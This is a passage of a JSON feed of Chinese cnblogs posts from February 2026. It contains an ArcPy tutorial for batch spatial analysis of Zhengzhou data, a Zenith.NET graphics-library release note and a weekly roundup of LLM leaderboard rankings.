/>\n<p><a href=\"http://blog.daimajiangxin.com.cn\" rel=\"noopener nofollow\" target=\"_blank\">原文来自:http://blog.daimajiangxin.com.cn</a></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-16 16:51</span>&nbsp;\n<a href=\"https://www.cnblogs.com/daimajiangxin\">代码匠心</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "ArcPy 脚本：批量生成郑州市 1990-2019 年空间分析结果（核密度、热点、平均中心、标准差椭圆）",
      "link": "https://www.cnblogs.com/Laurentianelle/p/19620124",
      "published": "",
      "description": "<h1 class=\"postTitle\"><a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/Laurentianelle/p/19620124\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 13:41\">\n    <span>ArcPy 脚本：批量生成郑州市 1990-2019 年空间分析结果（核密度、热点、平均中心、标准差椭圆）</span>\n    \n\n</a>\n</h1>\n\t<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"arcpy-脚本批量生成郑州市-1990-2019-年空间分析结果核密度热点平均中心标准差椭圆\">ArcPy 脚本：批量生成郑州市 1990-2019 年空间分析结果（核密度、热点、平均中心、标准差椭圆）</h1>\n<h2 id=\"背景介绍\">背景介绍</h2>\n<p>在城市研究中，我们常常需要分析多年数据的空间分布模式，比如建筑物高度在郑州市的聚集情况、热点区域变化、整体中心位置迁移以及分布方向趋势。如果每年手动在 ArcGIS 中运行四种空间分析工具，会非常耗时且容易出错。这个脚本就是为了解决这个问题而写的——它能自动批量处理 1990 到 2019 共 30 年的数据，一键生成四类分析结果，让你把精力放在结果解读上，而不是重复操作上。</p>\n<h2 id=\"代码功能说明\">代码功能说明</h2>\n<p>这个脚本的核心功能是：<strong>自动读取每一年郑州市的点要素数据（shp 文件），依次完成四种常见空间统计分析，并将结果整齐保存到对应的文件夹中</strong>。</p>\n<p>具体能实现的效果：</p>\n<ul>\n<li>核密度分析 → 生成每年建筑物高度的密度栅格图（tif）</li>\n<li>冷热点分析（Getis-Ord Gi*） → 生成每年显著的高值/低值聚集区域（shp）</li>\n<li>平均中心 → 计算每年高度加权的中心点（shp）</li>\n<li>标准差椭圆（方向分布） → 绘制每年数据的分布方向和离散程度（shp）</li>\n</ul>\n<p>适用场景：城市地理、规划、人口、经济等时空格局研究，特别是需要对比多年变化的场景。</p>\n<p>运行完成后，你会在输出文件夹里看到四个子文件夹（核密度、冷热点、平均中心、椭圆），每个文件夹里按年份命名整齐存放对应结果文件，总共约 120 个文件（30 年 × 4 类）。</p>\n<h2 id=\"运行环境准备\">运行环境准备</h2>\n<p>要运行这个脚本，你需要：</p>\n<ul>\n<li>安装 <strong>ArcGIS Pro</strong>（推荐 2.8 或更高版本）或 <strong>ArcGIS Desktop 10.x</strong>（带 Spatial Analyst 扩展）</li>\n<li>脚本使用的是 ArcGIS 自带的 Python 环境和 arcpy 模块，<strong>不需要额外用 pip 安装任何包</strong></li>\n<li>确保你的 ArcGIS 许可证已启用 <strong>Spatial Analyst</strong> 扩展（脚本会自动 checkout）</li>\n</ul>\n<p><strong>注意</strong>：普通 Python（如 Anaconda）无法运行此脚本，必须在 ArcGIS 提供的 Python 环境中执行。</p>\n<h2 id=\"详细运行步骤\">详细运行步骤</h2>\n<p>按照以下顺序操作，新手也能一步步跑通。每一步都说明了“为什么要这么做”。</p>\n<ol>\n<li>\n<p><strong>准备输入数据</strong><br />\n为什么：脚本会按年份逐个读取 shapefile 文件，如果路径或文件名不对就会报错。<br />\n操作：</p>\n<ul>\n<li>在你的磁盘上新建一个输入文件夹（例如 <code>D:\\CMAB_data\\input</code>）</li>\n<li>在里面按年份建立子文件夹：<code>1990</code>、<code>1991</code>、...、<code>2019</code></li>\n<li>将每年的点数据命名为 <code>郑州市_XXXX.shp</code>（XXXX 为年份），放入对应年份的子文件夹中<br />\n（数据结构示例：<code>输入文件夹\\1990\\郑州市_1990.shp</code>）</li>\n</ul>\n</li>\n<li>\n<p><strong>创建输出和临时文件夹</strong><br />\n为什么：脚本需要地方存放结果和临时文件，避免污染其他目录。<br />\n操作：</p>\n<ul>\n<li>新建输出文件夹，例如 <code>D:\\CMAB_data\\output\\郑州</code></li>\n<li>新建临时文件夹（scratch），例如 <code>D:\\CMAB_data\\scratch</code>（空间足够大即可）</li>\n</ul>\n</li>\n<li>\n<p><strong>保存并修改代码</strong><br />\n为什么：路径必须指向你自己的文件夹，否则找不到文件。<br />\n操作：</p>\n<ul>\n<li>将下面的完整代码复制到一个新文件中，保存为 <code>zhengzhou_spatial_analysis.py</code></li>\n<li><strong>重点修改以下三行路径</strong>（用你的实际路径替换方括号内的内容）：</li>\n</ul>\n<pre><code class=\"language-python\">input_base_dir = r\"【你的输入基础目录】\"    # 示例: r\"D:\\CMAB_data\\input\"\noutput_base_dir = r\"【你的输出基础目录】\"   # 示例: r\"D:\\CMAB_data\\output\\郑州\"\nscratch_dir = r\"【你的临时目录】\"            # 示例: r\"D:\\CMAB_data\\scratch\"\n</code></pre>\n</li>\n<li>\n<p><strong>运行脚本</strong><br />\n为什么：在 ArcGIS 自带的 Python 环境中运行才能调用 arcpy。<br />\n操作（两种方式任选其一）：</p>\n<ul>\n<li><strong>方式一（推荐）</strong>：打开 ArcGIS Pro → 顶部菜单“分析” → “Python” → 打开 Python 窗口 → 拖入你的 <code>.py</code> 文件 → 回车执行</li>\n<li><strong>方式二</strong>：在 Windows 开始菜单找到 “Python Command Prompt（ArcGIS Pro）” → 输入 <code>python C:\\path\\to\\zhengzhou_spatial_analysis.py</code><br />\n运行过程会在控制台打印进度，大约几分钟到十几分钟（取决于电脑性能和数据量）。</li>\n</ul>\n</li>\n<li>\n<p><strong>验证结果</strong><br />\n为什么：确认脚本是否成功生成了所有文件。<br />\n操作：</p>\n<ul>\n<li>运行结束后，控制台会打印统计信息（每个文件夹多少文件）</li>\n<li>打开输出文件夹，检查四个子文件夹是否都有按年份命名的文件</li>\n<li>用 ArcGIS Pro 打开任意几个结果文件查看是否正常显示</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"核心代码解析\">核心代码解析</h2>\n<p>下面是完整代码（已将个人路径模糊化）。我们用大白话逐段解释关键逻辑。</p>\n<pre><code class=\"language-python\">import arcpy\nimport os\nimport shutil\n\ndef clean_previous_results(output_base_dir, sub_folders):\n    \"\"\"删除之前的结果文件\"\"\"\n    print(\"正在清理之前的输出结果...\")\n  \n    for folder_name in sub_folders.values():\n        folder_path = os.path.join(output_base_dir, folder_name)\n        if os.path.exists(folder_path):\n            try:\n                # 删除文件夹内所有内容，但保留文件夹本身\n                for filename in os.listdir(folder_path):\n                    file_path = os.path.join(folder_path, filename)\n                    try:\n                        if os.path.isfile(file_path) or os.path.islink(file_path):\n                            os.unlink(file_path)\n                        elif os.path.isdir(file_path):\n                            shutil.rmtree(file_path)\n                    except Exception as e:\n                        print(f\" 删除 {file_path} 失败: {e}\")\n                print(f\" 已清理: {folder_name}\")\n            except Exception as e:\n                print(f\" 清理 {folder_name} 文件夹时出错: {e}\")\n        else:\n            # 如果文件夹不存在，创建它\n            os.makedirs(folder_path, exist_ok=True)\n            print(f\" 创建了: {folder_name}\")\n\ndef run_analysis():\n    # ================= 配置区域 =================\n    input_base_dir = r\"【你的输入基础目录】\"\n    output_base_dir = r\"【你的输出基础目录】\"\n    scratch_dir = r\"【你的临时目录】\"\n  \n    arcpy.CheckOutExtension(\"Spatial\")\n    arcpy.env.overwriteOutput = True\n  \n    sub_folders = {\n        \"kde\": \"核密度\",\n        \"hotspot\": \"冷热点\",\n        \"mean_center\": \"平均中心\",\n        \"ellipse\": \"椭圆\"\n    }\n  \n    # ================= 清理之前的输出结果 =================\n    clean_previous_results(output_base_dir, sub_folders)\n  \n    # ================= 开始循环处理 (1990-2019) =================\n    for year in range(1990, 2020):\n        input_shp = os.path.join(input_base_dir, str(year), f\"郑州市_{year}.shp\")\n      \n        if not os.path.exists(input_shp):\n            print(f\"文件不存在，跳过: {input_shp}\")\n            continue\n          \n        print(f\"\\n正在处理: {year} 年数据...\")\n      \n        try:\n            # --- 任务1: 核密度 ---\n            temp_point_path = os.path.join(scratch_dir, f\"temp_pts_{year}.shp\")\n            arcpy.management.FeatureToPoint(input_shp, temp_point_path, \"INSIDE\")\n          \n            out_raster_path = os.path.join(output_base_dir, sub_folders[\"kde\"], f\"{year}年郑州市.tif\")\n            out_kde = arcpy.sa.KernelDensity(temp_point_path, \"height\", 30, None, \"SQUARE_METERS\")\n            out_kde.save(out_raster_path)\n            arcpy.management.Delete(temp_point_path)\n            print(f\" √ 任务1完成: 核密度\")\n            \n            # --- 任务2: 热点分析 ---\n            out_hotspot_path = os.path.join(output_base_dir, sub_folders[\"hotspot\"], f\"{year}年郑州市冷热点.shp\")\n          \n            try:\n                arcpy.stats.HotSpotAnalysis(\n                    input_shp, \"height\", out_hotspot_path,\n                    \"FIXED_DISTANCE_BAND\", \"EUCLIDEAN_DISTANCE\", \"NONE\",\n                    None, None, \"FEATURE_CLASS\"\n                )\n            except AttributeError:\n                try:\n                    arcpy.stats.HotSpotAnalysis_GetisOrdGi(\n                        input_shp, \"height\", out_hotspot_path,\n                        \"FIXED_DISTANCE_BAND\", \"EUCLIDEAN_DISTANCE\", \"NONE\",\n                        None, None, \"FEATURE_CLASS\"\n                    )\n                except AttributeError:\n                    arcpy.HotSpots_stats(input_shp, \"height\", out_hotspot_path)\n                  \n            print(f\" √ 任务2完成: 热点分析\")\n            \n            # --- 任务3: 平均中心 ---\n            out_center_path = os.path.join(output_base_dir, sub_folders[\"mean_center\"], f\"{year}郑州.shp\")\n            arcpy.stats.MeanCenter(input_shp, out_center_path, \"height\")\n          \n            arcpy.management.AddField(out_center_path, \"年份\", \"TEXT\", field_length=10)\n            with arcpy.da.UpdateCursor(out_center_path, [\"年份\"]) as cursor:\n                for row in cursor:\n                    row[0] = str(year)\n                    cursor.updateRow(row)\n            print(f\" √ 任务3完成: 平均中心 (已添加年份字段)\")\n            \n            # --- 任务4: 方向分布 ---\n            out_ellipse_path = os.path.join(output_base_dir, sub_folders[\"ellipse\"], f\"{year}郑州.shp\")\n            arcpy.stats.DirectionalDistribution(input_shp, out_ellipse_path, \"1_STANDARD_DEVIATION\", \"height\")\n          \n            arcpy.management.AddField(out_ellipse_path, \"年份\", \"TEXT\", field_length=10)\n            with arcpy.da.UpdateCursor(out_ellipse_path, [\"年份\"]) as cursor:\n                for row in cursor:\n                    row[0] = str(year)\n                    cursor.updateRow(row)\n            print(f\" √ 任务4完成: 标准差椭圆 (已添加年份字段)\")\n          \n            print(f\" ✓ {year} 年数据处理完成！\")\n          \n        except Exception as e:\n            print(f\" ✗ 处理 {year} 年数据时发生错误: {str(e)}\")\n            import traceback\n            traceback.print_exc()\n            \n    # ================= 最终统计 =================\n    print(\"\\n\" + \"=\"*50)\n    print(\"所有处理已完成！\")\n    print(\"\\n输出结果统计:\")\n    print(\"-\"*30)\n  \n    total_files = 0\n    for folder_key, folder_name in sub_folders.items():\n        folder_path = os.path.join(output_base_dir, folder_name)\n        if os.path.exists(folder_path):\n            if folder_key == \"kde\":\n                files = [f for f in os.listdir(folder_path) if f.endswith('.tif')]\n            else:\n                files = [f for f in os.listdir(folder_path) if f.endswith('.shp')]\n          \n            count = len(files)\n            total_files += count\n            print(f\"{folder_name} 文件夹: {count} 个文件\")\n          \n            if count &gt; 0:\n                print(f\" 示例: {', '.join(files[:3])}\" + (\"...\" if count &gt; 3 else \"\"))\n        else:\n            print(f\"{folder_name} 文件夹: 不存在\")\n  \n    print(f\"\\n总计生成: {total_files} 个结果文件\")\n    print(\"=\"*50)\n\nif __name__ == '__main__':\n    run_analysis()\n</code></pre>\n<p><strong>大白话解释核心逻辑</strong>：</p>\n<ul>\n<li><code>for year in range(1990, 2020)</code>：就像一个自动翻页的书，从 1990 年到 2019 年一张张处理。</li>\n<li>每一年先检查文件是否存在，不存在就跳过（避免程序直接崩溃）。</li>\n<li>核密度：先把面转成点（因为核密度工具需要点），然后计算“哪里点最密集”，输出一张热力图一样的栅格。</li>\n<li>热点分析：直接告诉 ArcGIS “用高度字段找出显著的高值聚集和低值聚集区”。</li>\n<li>平均中心：计算所有点的高度加权中心，就像找一群人的“平均位置”，但高楼影响更大。</li>\n<li>标准差椭圆：画一个椭圆包裹大部分点，显示整体分布的方向和范围。</li>\n<li>每次分析完都会在结果文件里加一个“年份”字段，方便后期合并所有年份一起分析。</li>\n<li>最后统一统计生成了多少文件，给你一个清晰的完成反馈。</li>\n</ul>\n<h2 id=\"常见问题解决\">常见问题解决</h2>\n<ul>\n<li>\n<p><strong>报错 “RuntimeError: Cannot check out Spatial Analyst”</strong><br />\n原因：许可证未启用 Spatial Analyst 扩展。<br />\n解决：在 ArcGIS Pro 中 → 项目 → 许可 → 确认 Spatial Analyst 已勾选。</p>\n</li>\n<li>\n<p><strong>找不到输入文件，提示文件不存在</strong><br />\n原因：路径写错或文件名不完全匹配（区分大小写、后缀完整）。<br />\n解决：仔细检查 <code>input_base_dir</code> 和文件实际位置，确保是原始字符串（加 r 前缀）。</p>\n</li>\n<li>\n<p><strong>热点分析函数报 AttributeError</strong><br />\n原因：不同 ArcGIS 版本函数名不同。<br />\n解决：脚本已内置多种尝试，通常能自动适配；若仍失败，请确认你的 ArcGIS 版本。</p>\n</li>\n<li>\n<p><strong>磁盘空间不足或权限问题</strong><br />\n原因：输出/临时目录无写权限或空间不够。<br />\n解决：选择有足够空间的磁盘，确保当前用户对文件夹有写权限。</p>\n</li>\n<li>\n<p><strong>运行特别慢</strong><br />\n原因：数据量大或电脑配置一般。<br />\n解决：可以先拿几年的数据测试（修改 range(1990, 1995)），确认没问题再跑全部。</p>\n</li>\n</ul>\n<p>按照上面步骤操作，新手也能顺利跑通并得到完整的多年空间分析结果。祝你分析愉快！</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n\t<div class=\"postDesc\">posted on \n<span id=\"post-date\">2026-02-16 13:41</span>&nbsp;\n<a href=\"https://www.cnblogs.com/Laurentianelle\">Laurentianelle</a>&nbsp;\n阅读(<span id=\"post_view_count\">63</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "Zenith.NET v0.0.6 发布  — API 大幅精简，为 Metal 后端铺路",
      "link": "https://www.cnblogs.com/xymfblogs/p/19620088",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/xymfblogs/p/19620088\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 12:58\">\n    <span>Zenith.NET v0.0.6 发布 🧧 — API 大幅精简，为 Metal 后端铺路</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>大家好！我是 <a href=\"https://github.com/qian-o\" rel=\"noopener nofollow\" target=\"_blank\">@qian-o</a>，Zenith.NET v0.0.6 正式发布了！</p>\n<p>这个版本的核心主题是 <strong>精简</strong>：为了让 API 更好地适配即将上线的 Metal 后端，我们对资源绑定模型、着色器阶段和光线追踪方案做了一次大规模的重构和瘦身。</p>\n<blockquote>\n<p>📦 GitHub 仓库：<a href=\"https://github.com/qian-o/Zenith.NET\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/qian-o/Zenith.NET</a><br />\n📚 文档站点：<a href=\"https://qian-o.github.io/Zenith.NET\" rel=\"noopener nofollow\" target=\"_blank\">https://qian-o.github.io/Zenith.NET</a></p>\n</blockquote>\n<h2 id=\"-项目简介\">🎯 项目简介</h2>\n<p><strong>Zenith.NET</strong> 是一个现代的、跨平台的 .NET 图形与计算库，旨在为 .NET 开发者提供统一的 GPU 编程接口。无论你是要做高性能渲染、图形应用，还是 GPU 通用计算，Zenith.NET 都能帮你屏蔽底层 API 的差异，让代码在不同平台上无缝运行。</p>\n<h2 id=\"-本次更新亮点\">✨ 本次更新亮点</h2>\n<h3 id=\"-resourceset--resourcetable\">🔄 ResourceSet → ResourceTable</h3>\n<p>资源集合从 <code>ResourceSet</code> 全面更名为 <code>ResourceTable</code>，绑定方式也做了简化：</p>\n<p>之前：<code>commandBuffer.SetResourceSet(resourceSet, index);</code><br />\n现在：<code>commandBuffer.SetResourceTable(resourceTable);</code></p>\n<p>不再需要手动传入索引，使用更直观。</p>\n<h3 id=\"-单一-resourcelayout\">📦 单一 ResourceLayout</h3>\n<p>所有管线描述（Graphics / Compute / MeshShading）中的 <code>ResourceLayout[]</code> 统一改为单个 <code>ResourceLayout?</code>。这个改动大幅降低了资源绑定的复杂度，同时也更贴合 Metal 的设计模型，为后续 Metal 后端上线扫清了障碍。</p>\n<h3 id=\"-移除-raytracingpipeline拥抱-rayquery\">🚀 移除 RayTracingPipeline，拥抱 RayQuery</h3>\n<p>这是本次最大的变更。我们移除了独立的 <code>RayTracingPipeline</code>，包括 <code>HitGroup</code>、<code>DispatchRays()</code> 等全部相关 API。</p>\n<p>光线追踪现在统一通过 <strong>RayQuery</strong> 实现，可以在<strong>任意着色器阶段</strong>中使用，不再需要专用的光追管线。这个方向更灵活，跨后端兼容性也更好。</p>\n<h3 id=\"️-清理历史着色器阶段\">✂️ 清理历史着色器阶段</h3>\n<p>移除了 <code>Hull</code>、<code>Domain</code>、<code>Geometry</code> 等传统着色器阶段，以及所有光追专用阶段（<code>RayGeneration</code>、<code>Miss</code>、<code>ClosestHit</code> 等）。<code>PrimitiveTopology</code> 也精简掉了邻接拓扑和 <code>PatchList</code>。</p>\n<p>这些功能在现代图形 API 中已经被 Mesh Shading 和 RayQuery 取代，清理后 API 表面更小更干净。</p>\n<h3 id=\"-meshshading-线程组大小\">📐 MeshShading 线程组大小</h3>\n<p><code>MeshShadingPipelineDesc</code> 新增了 Object 和 Mesh 阶段的线程组大小字段，给予开发者更精细的调度控制。</p>\n<h3 id=\"-apple-平台统一命名\">🍎 Apple 平台统一命名</h3>\n<p>文档和 Issue 模板中原来分开的 \"macOS\" 和 \"iOS\" 统一为 <strong>Apple</strong> 标签，更清晰地表达对整个苹果生态的支持。</p>\n<h2 id=\"️-破坏性变更一览\">⚠️ 破坏性变更一览</h2>\n<p>如果你从 v0.0.5 升级，请注意以下改动：</p>\n<ul>\n<li><code>ResourceSet</code> / <code>ResourceSetDesc</code> → <code>ResourceTable</code> / <code>ResourceTableDesc</code></li>\n<li><code>ResourceLayout[]</code> → <code>ResourceLayout?</code></li>\n<li><code>SetResourceSet(resourceSet, index)</code> → <code>SetResourceTable(resourceTable)</code></li>\n<li><code>RayTracingPipeline</code>、<code>HitGroup</code>、<code>DispatchRays()</code> 已移除，请改用 <strong>RayQuery</strong></li>\n<li><code>Hull</code>、<code>Domain</code>、<code>Geometry</code> 着色器阶段已移除</li>\n<li><code>PrimitiveTopology</code> 邻接拓扑和 <code>PatchList</code> 已移除</li>\n</ul>\n<h2 id=\"️-接下来的计划\">🗺️ 接下来的计划</h2>\n<ul>\n<li><strong>Metal 后端</strong> — 将在近期版本中正式上线，初步计划基于 <a href=\"https://github.com/IsaacMarovitz/SharpMetal\" rel=\"noopener nofollow\" target=\"_blank\">SharpMetal</a> 或 .NET <code>macios</code> TFM 搭建，具体技术路线还在评估中</li>\n<li><strong>SkiaSharp 集成</strong></li>\n</ul>\n<h2 id=\"-当前状态\">🚧 当前状态</h2>\n<ul>\n<li>⚠️ <strong>预览版本</strong> — API 后续仍可能有破坏性变更</li>\n<li>⚠️ <strong>Metal 后端开发中</strong> — macOS / iOS 原生支持即将到来</li>\n<li>✅ <strong>文档已上线</strong> — 入门教程和 API 参考已可用</li>\n<li>✅ <strong>6 大 UI 框架集成</strong> — 覆盖主流 .NET UI 方案</li>\n</ul>\n<h2 id=\"-讨论与反馈\">💬 讨论与反馈</h2>\n<p>如果你有任何疑问、建议、Bug 反馈或功能请求，欢迎通过 GitHub Issues 和 Discussions 交流。</p>\n<hr />\n<p>🧧 今天是除夕，祝全球华人 <strong>2026 新春快乐，马年大吉，万事如意！</strong></p>\n<p>感谢大家的关注和支持，欢迎 Star ⭐ 和提 Issue，我们下个版本见！🚀</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-16 12:58</span>&nbsp;\n<a href=\"https://www.cnblogs.com/xymfblogs\">o王先生o</a>&nbsp;\n阅读(<span id=\"post_view_count\">104</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "大模型榜单周报（2026/02/15）",
      "link": "https://www.cnblogs.com/xjk15082/p/19619738",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/xjk15082/p/19619738\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 10:15\">\n    <span>大模型榜单周报（2026/02/15）</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h2 id=\"1-本周概览\">1. 本周概览</h2>\n<p>本周大模型行业迎来多项重要发布与升级。ChatGPT启动广告测试，谷歌宣布对Gemini3 Deep Think进行重大升级，推出专门针对科学、研究与工程场景的\"推理模式\"。千问团队推进Qwen3.5系列模型发布，字节正式发布新一代视频创作模型Seedance2.0。DeepSeek上线新模型，上下文窗口提升至1M tokens，智谱上线并开源GLM-5，MiniMax上线最新旗舰模型M2.5。OpenRouter榜单出现重大变动，Kimi K2.5从第3名跃升至第1名，使用量翻倍增长125%，Moonshot超越OpenAI成为第三大厂商。Anthropic在多个能力榜单中表现强劲，Claude 4.6包揽编程能力榜单前两名，Text Arena榜单包揽前2名。</p>\n<h2 id=\"2-重点关注事件\">2. 重点关注事件</h2>\n<ul>\n<li><strong>ChatGPT启动广告测试</strong>（2.10）：OpenAI开始在ChatGPT中测试广告功能，标志着商业化探索的新阶段。</li>\n<li><strong>谷歌宣布Gemini 3 Deep Think重大升级</strong>（2.12）：推出专门针对科学、研究与工程场景开发的\"推理模式\"，旨在推动智能前沿发展。</li>\n<li><strong>千问团队推进Qwen 3.5系列发布</strong>（2.9）：已向HuggingFace代码库提交相关支持PR，新系列模型即将面世。</li>\n<li><strong>字节正式发布Seedance 2.0</strong>（2.12）：新一代视频创作模型采用统一的多模态音视频联合生成架构，支持文字、图片、音频、视频四种模态输入，集成了目前业界最全面的多模态内容参考和编辑能力。</li>\n<li><strong>DeepSeek上线新模型</strong>（2.12）：核心升级包括上下文窗口上限提升至1M tokens，长上下文场景表现突出；整体响应速度明显提升；知识库截止日期显示为2025年5月。新模型仍为纯文本模型，不支持多模态输入。目前官方尚未发布正式公告。</li>\n<li><strong>智谱上线并开源GLM-5</strong>（2.12）：定位为面向复杂系统工程和长程Agentic任务的基座模型，在Coding与Agent能力上取得开源SOTA表现。</li>\n<li><strong>MiniMax上线M2.5旗舰模型</strong>（2.12）：最新旗舰模型现已开放访问，用户可通过Web端和桌面端的MiniMax Agent调用该模型。</li>\n</ul>\n<h2 id=\"3-榜单变化\">3. 榜单变化</h2>\n<h3 id=\"openrouter模型调用量排名\">OpenRouter模型调用量排名</h3>\n<ul>\n<li><strong>整体调用量</strong>：Kimi K2.5从第3名跃升至第1名，使用量翻倍增长125%，以1.52T tokens遥遥领先，是第2名的2倍多。Anthropic两个模型新入前十，Claude Opus 4.6入榜。Trinity Large Preview (free)作为免费模型增长81%。另外有两个模型跌出前十：Grok Code Fast 1（上期第8）和Claude Opus 4.5（上期第6，被4.6替代）。</li>\n<li><strong>模型市占率</strong>：Moonshot超越OpenAI，成为OpenRouter平台第三大厂商，与Google、Anthropic并立。Google虽然总量微增（1.58T→1.68T），但市场份额流失近1/6，从23%降到19%。MiniMax份额大增1.7%（4.7%→6.4%），tokens涨80%。</li>\n<li><strong>模型吞吐量</strong>：OpenAI gpt-oss 120B速度暴涨29%（447→576 tok/s），排名反超20B小模型。Meta 3款模型同时进入Top 10，成为入围最多的厂商，Llama 3.3 70B直接挤掉Google Gemini 2.5 Flash Lite，Llama 4系列（Maverick+Scout）双入榜。</li>\n<li><strong>编程调用量</strong>：Kimi在编程场景展现统治力，市占率30.8%，远超其在通用场景的12.6%份额，同时领先第二名近20个百分点。Claude Opus 4.6空降第3，按Anthropic整体下滑。上期Anthropic双模型（Opus 4.5 + Sonnet 4.5）合计16.6%，本期Anthropic双模型（Opus 4.6 + Sonnet 4.5）合计11.3%。</li>\n</ul>\n<h3 id=\"各领域能力榜单\">各领域能力榜单</h3>\n<ul>\n<li><strong>大语言模型Text Arena</strong>：Anthropic包揽前2，终结了Google霸榜，分数突破1500分大关，\"thinking\"版本领先基础版6分。Kimi K2.5-thinking入榜，第18名（1447分）。GLM-5第11名（1452分），智谱成为新的中国质量代表。</li>\n<li><strong>编程能力榜单（Code Arena）</strong>：Claude 4.6霸榜前两名，分数突破1560分，较上期冠军（1500分）提升4.5%；Anthropic包揽前3（含4.5-thinking-32k），保持绝对统治。Google模型被GPT-5.2-high（第4）、GLM-5（第6）超越。智谱GLM-5成为本期最大黑马，直接杀入前6，分数1449分，超越Google Gemini 2.5 Pro。</li>\n<li><strong>文生图能力榜单（Artificial Analysis Text to Image Leaderboard）</strong>：xAI Grok空降第5，xAI首次进入图像生成Top 10，分数1190，超越字节Seedream 4.0（1189）和FLUX.2 [flex]（1184）。</li>\n<li><strong>理科能力榜单（GPQA LLM Stats）</strong>：无重要变化。</li>\n<li><strong>前沿数学能力榜单（EPOCH AI FrontierMath）</strong>：Anthropic 4.6代全面取代4.5代，3款配置全部进入Top 5。Google Gemini 3 Pro Preview下跌，从第4跌至第6。</li>\n<li><strong>HLE（Human's Last Exam）</strong>：无重要变化。</li>\n</ul>\n<h2 id=\"4-排行榜\">4. 排行榜</h2>\n<table>\n<thead>\n<tr>\n<th>测评类型</th>\n<th>第一名</th>\n<th>第二名</th>\n<th>第三名</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>模型调用量</td>\n<td>Kimi K2.5</td>\n<td>Gemini 3 Flash Preview</td>\n<td>DeepSeek V3.2</td>\n</tr>\n<tr>\n<td>公司市占率</td>\n<td>Google</td>\n<td>Anthropic</td>\n<td>MoonShotai</td>\n</tr>\n<tr>\n<td>模型速度</td>\n<td>gpt-oss-safeguard-20b</td>\n<td>Qwen3 32B</td>\n<td>gpt-oss-120b</td>\n</tr>\n<tr>\n<td>编程模型调用量</td>\n<td>Kimi K2.5</td>\n<td>MiniMax M2.1</td>\n<td>Claude Opus 4.6</td>\n</tr>\n</tbody>\n</table>\n<h3 id=\"各公司按不同能力领域排名汇总\">各公司按不同能力领域排名汇总</h3>\n<table>\n<thead>\n<tr>\n<th>测评类型</th>\n<th>领先公司</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>大语言模型 Text Arena</td>\n<td>Anthropic、Google、xAI、OpenAI</td>\n</tr>\n<tr>\n<td>编程能力 Code Arena</td>\n<td>Anthropic、OpenAI、智谱、Google、Kimi</td>\n</tr>\n<tr>\n<td>编程能力 LiveCodeBench</td>\n<td>Anthropic、OpenAI、Google</td>\n</tr>\n<tr>\n<td>代码工程任务能力 SWE-bench</td>\n<td>Anthropic、Google、OpenAI</td>\n</tr>\n<tr>\n<td>图像编辑和生成能力 Image Edit Arena</td>\n<td>OpenAI、Google、xAI、字节、腾讯</td>\n</tr>\n<tr>\n<td>文生图能力 Text-to-Image Arena</td>\n<td>OpenAI、Google、xAI、Black Forest Labs、腾讯</td>\n</tr>\n<tr>\n<td>图像编辑和生成能力 Image Editing Leaderboard</td>\n<td>OpenAI、Google、xAI、腾讯、字节、Black Forest Labs、阿里巴巴、Reve</td>\n</tr>\n<tr>\n<td>文生图能力 Text to Image Leaderboard</td>\n<td>OpenAI、Google、Black Forest Labs、xAI、字节</td>\n</tr>\n<tr>\n<td>GPQA</td>\n<td>OpenAI、Google、Anthropic、xAI</td>\n</tr>\n<tr>\n<td>FrontierMath</td>\n<td>OpenAI、Anthropic、Google、月之暗面、DeepSeek</td>\n</tr>\n<tr>\n<td>Humanity's Last Exam</td>\n<td>Google、OpenAI、Anthropic</td>\n</tr>\n</tbody>\n</table>\n<hr />\n<p>关注我，第一时间掌握更多AI前沿资讯！</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-16 10:15</span>&nbsp;\n<a href=\"https://www.cnblogs.com/xjk15082\">KAI智习</a>&nbsp;\n阅读(<span id=\"post_view_count\">53</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    }
  ]
}